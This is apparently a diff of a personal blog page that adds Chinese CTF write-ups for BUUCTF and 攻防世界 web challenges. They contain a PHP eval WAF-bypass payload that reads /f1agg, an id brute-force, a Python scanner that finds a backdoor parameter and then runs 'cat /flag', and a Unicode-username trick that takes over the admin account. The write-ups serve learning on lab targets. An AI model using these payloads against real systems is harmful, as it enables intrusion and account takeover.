@@ -248,6 +248,632 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/BUUCTF-Easy-Calc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="diao-diao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diao-diao-UPUP">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/21/BUUCTF-Easy-Calc/" itemprop="url">BUUCTF-Easy Calc</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-21T10:21:08+08:00">
+                2020-01-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Easy-Calc"><a href="#Easy-Calc" class="headerlink" title="Easy Calc"></a>Easy Calc</h1><p>打开环境是个计算器，搜索一下Calc是什么</p>
+<p>最后发现是CSS中的一个样式，用于进行一下计算<br><a href="http://caibaojian.com/css3-calc.html" target="_blank" rel="noopener">http://caibaojian.com/css3-calc.html</a></p>
+<p>尝试一下注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">1 正常</span><br><span class="line">1’ 没有报错</span><br><span class="line">1&apos;# 直接给PASS了</span><br></pre></td></tr></table></figure>
+<p>到这里考虑不是SQL注入题</p>
+<p>crtl+u看一下源码 看到作者给了提示 写了WAF保障安全</p>
+<p>WAF：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$(&apos;#calc&apos;).submit(function()&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br><span class="line">            type:&apos;GET&apos;,</span><br><span class="line">            success:function(data)&#123;</span><br><span class="line">                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">            &lt;/div&gt;`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:function()&#123;</span><br><span class="line">                alert(&quot;这啥?算不来!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        return false;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>$(“#content”).val()是什么意思？  百度一下得知类似于HTML中的document.getElementById(“content”); </p>
+<p>再百度一下encodeURIComponent 得知是将参数进行URI编码</p>
+<p>再查看一下calc.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&apos;num&apos;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&apos;num&apos;];</span><br><span class="line">        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;,&apos;\$&apos;,&apos;\\&apos;,&apos;\^&apos;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&apos;echo &apos;.$str.&apos;;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>根据WAF来进行绕过</p>
+<p>接下来构造payload：<br>使用scandir（）返回根目录看一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1;var_dump(scandir(/));</span><br></pre></td></tr></table></figure>
+<p>发现不行 这里没有思路了 看一下WP知道了</p>
+<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】</p>
+<p>所以在num变量前加个空格来让WAF识别不到  并且用char()进行转义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/BUUCTF/Easy_Calc/0.png" alt="avatar"></p>
+<p>找到flagg目录</p>
+<p>那就继续读取 使用file_get_contents</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ics-06/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="diao-diao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diao-diao-UPUP">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ics-06/" itemprop="url">攻防世界-ics-06</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-20T11:52:18+08:00">
+                2020-01-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>进去之后感觉没有什么可以做的地方<br>用御剑扫描一下<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ics-06/0.png" alt="avatar"></p>
+<p>找到一个index.html  访问一下<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ics-06/1.png" alt="avatar"></p>
+<p>送分题？</p>
+<p>看了一下URL 有id=1</p>
+<p>打开bp 爆破一下 因为是数字 所以用python写一个字典出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range (<span class="number">10001</span>):</span><br><span class="line">    print(m)</span><br></pre></td></tr></table></figure>
+<p>直接爆破<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ics-06/2.png" alt="avatar"></p>
+<p>id=2333 改一下 然后发包<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ics-06/3.png" alt="avatar"></p>
+<p>得到flag</p>
+<p>真·送分题</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/20/BUUCTF-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="diao-diao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diao-diao-UPUP">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/20/BUUCTF-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/" itemprop="url">BUUCTF-高明的黑客</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-20T08:48:02+08:00">
+                2020-01-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1><p>打开之后得到一个提示源代码存在了<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></p>
+<p>当时比赛的时候遇到这个题，还一直脑残的以为是某个网站，哭了<br>直接URL访问之后，会下载到源码<br><a href="http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/www.tar.gz" target="_blank" rel="noopener">http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/www.tar.gz</a></p>
+<p>下载好了之后推测是个压缩包之类的，搜一下gz后缀，果然是常见于Linux和MacOS下的压缩包格式，直接7-zip解压</p>
+<p>发现有个src的文件，里面有很多杂乱的PHP文件，随便打开一个试试<br>发现读不太懂，但是像$_GET eval echo等还是有的</p>
+<p>这里就没有什么思路了，所以看了一下官方WP，找了一个爆破脚本遍历GET并传一些参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">path = <span class="string">"D:\phpStudy\phpStudy\PHPTutorial\WWW\src"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(file)</span>:</span></span><br><span class="line">    print(<span class="string">'finding...'</span>)</span><br><span class="line">    f = open(path + <span class="string">"/"</span> + file);  <span class="comment"># 打开文件</span></span><br><span class="line">    iter_f = iter(f);  <span class="comment"># 创建迭代器</span></span><br><span class="line">    str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> iter_f:  <span class="comment"># 遍历文件，一行行遍历，读取文本</span></span><br><span class="line">        str = str + line</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个页面内所有参数</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_GET['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">7</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        params[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_POST['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">8</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># eval test</span></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># assert test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = params[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = data[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("====================")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:  <span class="comment"># 遍历文件夹</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):  <span class="comment"># 判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">            <span class="comment"># read_file(file)</span></span><br><span class="line"></span><br><span class="line">            pool.submit(read_file, file)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_param</span><span class="params">(fileName)</span>:</span></span><br><span class="line">    url = <span class="string">"http://localhost/src/"</span></span><br><span class="line">    f = open(path+<span class="string">'/'</span>+fileName, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    content = f.read()</span><br><span class="line">    m = re.findall(<span class="string">"\$_(GET|POST)\['(.+?)'\]"</span>, content)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        <span class="keyword">for</span> seq <span class="keyword">in</span> m:</span><br><span class="line">            print(<span class="string">'finding...'</span>)</span><br><span class="line">            method = seq[<span class="number">0</span>]</span><br><span class="line">            param = seq[<span class="number">1</span>]</span><br><span class="line">            payload = <span class="string">''</span></span><br><span class="line">            payload += <span class="string">'?'</span></span><br><span class="line">            payload += param</span><br><span class="line">            payload += <span class="string">"="</span></span><br><span class="line">            payload += <span class="string">"echo glzjin"</span></span><br><span class="line">            res = requests.get(url + fileName + payload)</span><br><span class="line">            n = re.findall(<span class="string">'glzjin'</span>, res.text)</span><br><span class="line">            <span class="keyword">if</span> n:</span><br><span class="line">                print(<span class="string">'found!'</span>)</span><br><span class="line">                print(fileName, method, param, <span class="string">"found!"</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">elif</span> method == <span class="string">'POST'</span>:</span><br><span class="line">                postData = &#123; param: <span class="string">"echo glzjin'"</span> &#125;</span><br><span class="line">                res = requests.post(url + fileName, data=postData)</span><br><span class="line">                n = re.findall(<span class="string">'glzjin'</span>, res.text)</span><br><span class="line">                <span class="keyword">if</span> n:</span><br><span class="line">                    print(fileName, method, param, <span class="string">"found!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#find_file()</span></span><br><span class="line">    find_param(<span class="string">'xk0SzyKwfzw.php'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在运行脚本之前需要启动PHP环境 并根据自己的路径进行相应的修改<br><img src="/images/BUUCTF/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/0.png" alt="avatar"></p>
+<p>成功找到</p>
+<p>去这个文件去看看<br><img src="/images/BUUCTF/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/1.png" alt="avatar"><br>这个部分很关键</p>
+<p>接下来就构造payload:<br><a href="http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag" target="_blank" rel="noopener">http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</a></p>
+<p>得到flag</p>
+<p>感觉不是太懂官方这个WP 为什么说那一段代码很关键 我表示一脸懵逼看不出来<br>后面又找了一篇WP，看了一下，大概就是该后门的密码之类的<br>可以参考一下：<br><a href="https://www.cnblogs.com/chrysanthemum/p/11717337.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11717337.html</a></p>
+<p>另外官方的脚本感觉就像已经知道了是哪个文件 特定也出来的 速度非常快 可能这就是出题人自己写WP的弊病吧 建议采用一下上面这篇文章里的脚本 虽然很慢 但是有那种爆破的感觉了 而不是直接输出是哪个文件</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/18/BUUCTF-admin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="diao-diao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diao-diao-UPUP">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/18/BUUCTF-admin/" itemprop="url">BUUCTF-admin</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-18T09:42:22+08:00">
+                2020-01-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>打开环境，再根据题目，可以猜测大概是伪造admin登录就OK了<br>没有什么思路 先随便注册一个吧<br>登录之后，点change password  查看一下源码<br>得到hint<br><img src="/images/BUUCTF/admin/0.png" alt="avatar"></p>
+<p>又又又又是flask  我要吐了</p>
+<p>复制连接 下载一下</p>
+<p>随后打开index.php 查看代码</p>
+<p>flask之前比赛时遇到过，CNSS也遇到过，一个轻量级的python框架，这题有两种解法，一种是session  写脚本就可以直接得到 但是奈何不会写</p>
+<p>所以只好使用strlower  转小写函数去尝试注册ADMIN<br>哦豁，发现GG了，那再看看strlower的定义中有nodeprep.prepare()这个函数<br>我们先使用unicode编码的字符 ᴬ<br>用这个用户名注册</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬdmin</span><br></pre></td></tr></table></figure>
+<p>这个时候nodeprep.prepare()函数会将用户名变为Admin，随便修改一下密码，就会再次调用该函数变为admin</p>
+<p>这个时候其实已经覆写了admin的密码 直接登录</p>
+<p>得到flag</p>
+<p>这里是利用了unicode的编码问题<br>可以参考一下：<br><a href="https://unicode-table.com/en/blocks/phonetic-extensions/" target="_blank" rel="noopener">https://unicode-table.com/en/blocks/phonetic-extensions/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/18/BUUCTF-EasySQL-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1323,527 +1949,11 @@ D：（-1，+1，-1，-1，-1，-1，+1，-1）
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/19/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="diao-diao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="diao-diao-UPUP">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/19/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/" itemprop="url">快速排序</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
